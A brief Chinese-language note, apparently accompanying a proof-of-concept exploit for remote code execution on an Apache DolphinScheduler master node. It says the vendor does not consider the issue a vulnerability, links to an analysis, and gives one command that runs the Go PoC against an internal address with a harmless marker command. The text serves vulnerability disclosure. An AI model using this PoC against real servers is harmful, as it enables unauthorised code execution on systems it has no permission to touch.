此漏洞条件还是偏向于内网环境当中,官方认为客户环境应当是安全的，并不认为是个漏洞～～

分析：
https://52hertzi.com/2025/11/18/Apache-DolphinScheduler-master节点RCE/

```
go run master_rpc_logic_fake_rce_poc.go -target 10.1.1.10:5678 -cmd 'touch /tmp/master_rpc_rce_go'
```
